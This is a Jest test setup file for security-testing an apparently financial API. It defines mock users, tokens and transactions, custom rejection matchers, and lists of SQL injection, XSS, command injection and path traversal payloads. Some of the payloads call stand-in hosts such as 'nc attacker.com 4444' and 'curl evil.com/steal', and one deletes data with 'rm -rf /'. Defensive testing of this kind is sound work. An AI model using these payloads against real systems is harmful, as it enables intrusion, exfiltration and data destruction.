import { jest } from '@jest/globals';

// Mock Redis for testing
jest.mock('redis', () => ({
  createClient: jest.fn(() => ({
    connect: jest.fn(),
    disconnect: jest.fn(),
    set: jest.fn(),
    get: jest.fn(),
    del: jest.fn(),
    exists: jest.fn(),
    expire: jest.fn(),
    ttl: jest.fn(),
    keys: jest.fn(),
    flushall: jest.fn()
  }))
}));

// Mock crypto for deterministic testing when needed
const originalCrypto = require('crypto');
const mockCrypto = {
  ...originalCrypto,
  randomBytes: jest.fn((size: number) => {
    // Return predictable bytes for testing
    return Buffer.alloc(size, 0x42);
  }),
  randomUUID: jest.fn(() => 'test-uuid-12345')
};

// Security test utilities
global.securityTestUtils = {
  // Common injection payloads
  SQL_INJECTION_PAYLOADS: [
    "'; DROP TABLE users; --",
    "1' UNION SELECT * FROM users --",
    "admin'/*",
    "1; DELETE FROM accounts WHERE 1=1 --",
    "' OR '1'='1",
    "1' OR 1=1 --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --"
  ],

  XSS_PAYLOADS: [
    '<script>alert("xss")</script>',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe src=javascript:alert(1)></iframe>',
    '<body onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>"
  ],

  COMMAND_INJECTION_PAYLOADS: [
    '; ls -la',
    '| cat /etc/passwd',
    '&& rm -rf /',
    '`whoami`',
    '$(whoami)',
    '; nc attacker.com 4444',
    '| curl evil.com/steal?data=$(cat /etc/passwd)'
  ],

  PATH_TRAVERSAL_PAYLOADS: [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd'
  ],

  // Test data generators
  generateMaliciousFilenames: () => [
    'malware.exe',
    'script.js',
    '../../../etc/passwd',
    'test.php',
    'payload.asp',
    'backdoor.jsp',
    'shell.cgi',
    'virus.com'
  ],

  generateLargePayload: (size: number) => 'x'.repeat(size),

  generateDeepObject: (depth: number) => {
    let obj: any = {};
    let current = obj;
    for (let i = 0; i < depth; i++) {
      current.nested = {};
      current = current.nested;
    }
    current.value = 'deep';
    return obj;
  },

  generateManyKeys: (count: number) => {
    const obj: any = {};
    for (let i = 0; i < count; i++) {
      obj[`key${i}`] = `value${i}`;
    }
    return obj;
  },

  // Mock user data for testing
  mockUsers: {
    admin: {
      id: 'user-admin-123',
      role: 'admin',
      scopes: ['admin:*', 'finance:*'],
      twoFactorVerified: true
    },
    user: {
      id: 'user-regular-456',
      role: 'user',
      scopes: ['user:read'],
      twoFactorVerified: false
    },
    finance: {
      id: 'user-finance-789',
      role: 'finance',
      scopes: ['finance:ledger:post', 'finance:payout:create'],
      twoFactorVerified: true
    }
  },

  // Mock JWT tokens for testing (using safe test tokens)
  mockTokens: {
    valid: 'test-valid-jwt-token-for-security-testing',
    expired: 'test-expired-jwt-token-for-security-testing',
    malformed: 'invalid.token.here'
  },

  // Test financial data
  mockTransactions: {
    balanced: {
      externalId: 'tx-balanced-123',
      accountId: 'acc-456',
      entries: [
        {
          id: 'entry-1',
          transactionId: 'tx-1',
          accountId: 'acc-456',
          amount: { amount: 10000, currency: 'USD' },
          type: 'debit',
          description: 'Test debit'
        },
        {
          id: 'entry-2',
          transactionId: 'tx-1',
          accountId: 'acc-789',
          amount: { amount: 10000, currency: 'USD' },
          type: 'credit',
          description: 'Test credit'
        }
      ]
    },
    unbalanced: {
      externalId: 'tx-unbalanced-123',
      accountId: 'acc-456',
      entries: [
        {
          id: 'entry-1',
          transactionId: 'tx-1',
          accountId: 'acc-456',
          amount: { amount: 10000, currency: 'USD' },
          type: 'debit',
          description: 'Unbalanced debit'
        }
      ]
    },
    highValue: {
      externalId: 'tx-high-value-123',
      accountId: 'acc-456',
      amount: { amount: 999999999999, currency: 'USD' },
      entries: []
    }
  }
};

// Security assertion helpers
expect.extend({
  toBeSecurelyRejected(received: any, expectedStatus?: number) {
    const status = received.status || received.statusCode;
    const isSecurelyRejected = status >= 400 && status < 500;
    
    if (expectedStatus) {
      return {
        pass: status === expectedStatus,
        message: () => `Expected status ${expectedStatus}, got ${status}`
      };
    }
    
    return {
      pass: isSecurelyRejected,
      message: () => `Expected secure rejection (4xx), got ${status}`
    };
  },

  toNotCrashServer(received: any) {
    const status = received.status || received.statusCode;
    const didNotCrash = status < 500;
    
    return {
      pass: didNotCrash,
      message: () => `Expected no server crash, got ${status}`
    };
  },

  toContainSecurityHeaders(received: any) {
    const headers = received.headers || {};
    const securityHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'strict-transport-security',
      'content-security-policy'
    ];
    
    const missingHeaders = securityHeaders.filter(header => !headers[header]);
    
    return {
      pass: missingHeaders.length === 0,
      message: () => `Missing security headers: ${missingHeaders.join(', ')}`
    };
  }
});

// Global test timeout for security tests
jest.setTimeout(30000);

// Clean up after each test
afterEach(() => {
  jest.clearAllMocks();
});

// Global error handling for tests
process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  process.exit(1);
});

declare global {
  namespace jest {
    interface Matchers<R> {
      toBeSecurelyRejected(expectedStatus?: number): R;
      toNotCrashServer(): R;
      toContainSecurityHeaders(): R;
    }
  }
  
  var securityTestUtils: {
    SQL_INJECTION_PAYLOADS: string[];
    XSS_PAYLOADS: string[];
    COMMAND_INJECTION_PAYLOADS: string[];
    PATH_TRAVERSAL_PAYLOADS: string[];
    generateMaliciousFilenames: () => string[];
    generateLargePayload: (size: number) => string;
    generateDeepObject: (depth: number) => any;
    generateManyKeys: (count: number) => any;
    mockUsers: any;
    mockTokens: any;
    mockTransactions: any;
  };
}